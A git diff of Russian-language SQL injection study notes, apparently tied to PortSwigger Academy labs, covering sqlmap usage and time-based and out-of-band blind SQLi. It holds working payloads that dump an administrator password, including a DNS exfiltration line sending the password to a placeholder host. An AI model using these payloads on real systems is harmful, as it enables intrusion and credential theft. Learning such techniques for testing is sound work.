@@ -2,10 +2,9 @@ SQL-инъекция - это уязвимость веб-безопасност
 ## Источники информации
 - [SQL injection Learning Path PortSwigger Academy](https://portswigger.net/web-security/learning-paths/sql-injection/)
 - [SQLi Cheat Sheet PortSwigger Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-- База знаний: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+- [PayloadAllTheThings SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 ## Инструменты
-- [sqlmap](https://github.com/sqlmapproject/sqlmap): `sqlmap -u <url> --data <login=1&password=1>`, 
-`sqlmap -u <url> --cookie='id=1; PHPSESSID=abcdef' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID' --level=2` (SQLi в куки `id`)
+- [sqlmap](https://github.com/sqlmapproject/sqlmap): `sqlmap -u <url> --data <login=1&password=1>`, `sqlmap -u <url> --cookie='id=1; PHPSESSID=abcdef' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID' --level=2` (SQLi в куки `id`)
 ## Обнаружение SQLi
 - Вставка специальных символов в значение параметров: `'`, `"`, `\`
 - Булевы условия: `OR 1=1`, `OR 1=2`
@@ -48,6 +47,29 @@ SQL-инъекция - это уязвимость веб-безопасност
 ```bash
 sqlmap -u 'https://0a6c007e03a064fd8180ac2300c60091.web-security-academy.net/' --cookie='TrackingId=RO861hCz137UK4MN; session=6Wx5XJtrM4qzOZTEMFclYvojlja92S3q' -p 'TrackingId' --param-filter='COOKIE' --skip='session' --level=2 --dbms=postgresql -D public -T users -C password --where="username='administrator'" --dump
 ``` 
+#### Blind SQLi на основе временных задержек
+Атакующий может сделать запрос с условием, где в случае выполнения условия (`true`) будет вызываться временная задержка, при невыполнении условия будет задержки не будет. Из-за задержки в БД HTTP-ответ будет возвращаться так же с задержкой. Данная атака работает, если приложение работает синхронно (т.е.HTTP-ответ приходит после выполнения SQL-запроса).
+Примеры SQLi для MS SQL Server:
+```sql
+'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
+```
+```sql
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+```sql
+`'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) = 'a') = 1 WAITFOR DELAY '0:0:10'--`
+```
+#### Blind SQLi с помощью OAST (Out-of-Band Application Security Testing)
+Если приложение работает асинхронно (временные задержки невозможно эксплуатировать), атакующий может заставить БД обращаться ко внешним ресурсам с целью получения информации. Наиболее часто для этого используется протокол DNS. 
+Пример SQLi для MS SQL Server (БД отправляет DNS-запрос):
+```sql
+`'; exec master..xp_dirtree '//<site.com>/a'--`
+```
+Такие запросы атакующий может использовать для получения данных из БД. 
+Пример SQLi для MS SQL Server (БД отправляет DNS-запрос и добавляет данные из БД в качестве поддомена):
+```sql
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.<site.com>/a"')--
+```
 ### Error-based
 SQLi на основе ошибок (error-based) возникает, когда атакующий может использовать сообщения об ошибках для получения конфиденциальных данных из БД.
 #### Error-based SQLi на основе условных ошибок
